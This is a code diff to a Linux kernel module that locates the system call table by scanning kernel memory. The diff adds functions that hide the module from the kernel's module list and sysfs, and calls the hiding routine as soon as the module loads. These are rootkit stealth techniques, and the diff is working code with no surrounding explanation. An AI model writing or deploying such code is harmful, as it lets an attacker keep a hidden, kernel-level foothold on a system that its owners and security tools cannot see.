@@ -3,17 +3,20 @@
 #include <linux/errno.h>
 #include <linux/types.h>
 #include <linux/unistd.h>
-#include <asm/cacheflush.h>  
-#include <asm/page.h>  
+#include <asm/cacheflush.h>
+#include <asm/page.h>
 #include <asm/current.h>
 #include <linux/sched.h>
 #include <linux/syscalls.h>
 #include <linux/init.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 
 #define START_MEM   PAGE_OFFSET
 #define END_MEM     ULLONG_MAX
+
+struct list_head *prev_module;
 
 unsigned long long *syscall_table;
 
@@ -37,7 +40,39 @@ unsigned long long **find(void) {
   return NULL;
 }
 
+void hide_module(void) {
+  prev_module = THIS_MODULE->list.prev;
+
+  mutex_lock(&module_mutex);
+
+  list_del_rcu(&THIS_MODULE->list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);
+
+  synchronize_rcu();
+
+  kfree(THIS_MODULE->notes_attrs);
+  THIS_MODULE->notes_attrs = NULL;
+  kfree(THIS_MODULE->sect_attrs);
+  THIS_MODULE->sect_attrs = NULL;
+  kfree(THIS_MODULE->mkobj.mp);
+  THIS_MODULE->mkobj.mp = NULL;
+  THIS_MODULE->modinfo_attrs->attr.name = NULL;
+  kfree(THIS_MODULE->mkobj.drivers_dir);
+  THIS_MODULE->mkobj.drivers_dir = NULL;
+
+  mutex_unlock(&module_mutex);
+}
+
+void show_module(void) {
+  mutex_lock(&module_mutex);
+  list_add_rcu(&THIS_MODULE->list, prev_module);
+  synchronize_rcu();
+  mutex_unlock(&module_mutex);
+}
+
 static int init(void) {
+  hide_module();
 
   printk("\nModule starting...\n");
 
@@ -52,7 +87,7 @@ static int init(void) {
 
     printk("Syscall table not found!\n");
 
-  }   
+  }
 
   return 0;
 }
